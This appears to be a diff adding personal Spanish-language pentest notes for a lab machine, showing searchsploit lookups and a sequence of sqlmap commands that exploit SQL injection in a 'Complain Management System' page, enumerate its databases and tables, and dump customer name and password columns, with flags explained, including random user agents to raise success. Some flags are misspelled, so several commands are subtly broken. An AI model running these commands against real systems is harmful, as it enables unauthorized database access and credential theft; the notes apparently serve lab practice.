@@ -1,0 +1,48 @@
+
+
+::: searchsploit Complain Management System
+
+::: searchsploit -x php/webapps/42968.txt
+
+::: sqlmap -u "http://10.10.10.71:8008/complain/view.php?mod=admin?view=repod&id=plans" --cookie "PHPSESSID=5aar7t6ku4gdj45qvuadu71bs4" --dbs --batch --randon-agent --dbms=mysql
+        
+        --dbs   si es vulnerable a injeccion SQL listas las bases de datos disponibles
+        
+        --batch   introduce las respuestas de SI/NO YES/NO por defecto (es m]as comodo)
+        
+        --randon-agent   cambia el userAgent en cada consulta para aumentar la probabilidad de exito
+                            si estamos en firefox el userAgent es MozillaFirefoz
+                                          chrome                  chrome, etc etc...
+        
+        --dbms=mysql      el tipo de baseDdatos es MySql
+              MySql/PostgreSQL/Microsoft SQL Server/Oracle,etc...
+
+
+
+        !!! para obtener la cookie de session toy usando un plugin en el navegador  :)
+
+
+::: sqlmap -u "http://10.10.10.71:8008/complain/view.php?mod=admin?view=repod&id=plans" --cookie "PHPSESSID=5aar7t6ku4gdj45qvuadu71bs4" --D complain --tables --batch --randon-agent --dbms=mysql 
+
+
+    -D nombreBaseDatosHere       
+    --tables   lista las tablas
+
+
+
+    base de datos, tablas, columnas y datos
+
+
+::: sqlmap -u "http://10.10.10.71:8008/complain/view.php?mod=admin?view=repod&id=plans" --cookie "PHPSESSID=5aar7t6ku4gdj45qvuadu71bs4" -D complain -T tbl_customer --columns --batch --randon-agent --dbms=mysql 
+  
+    -T nombreTablaHere
+
+    --columns     lista las columnas 
+
+
+::: sqlmap -u "http://10.10.10.71:8008/complain/view.php?mod=admin?view=repod&id=plans" --cookie "PHPSESSID=5aar7t6ku4gdj45qvuadu71bs4" -D complain -T tbl_customer -C cname,cpass --dump --batch --randon-agent --dbms=mysql 
+
+
+    -C nombreColumna1,nombreColumna2
+
+    --dump            optener/dumpear columna
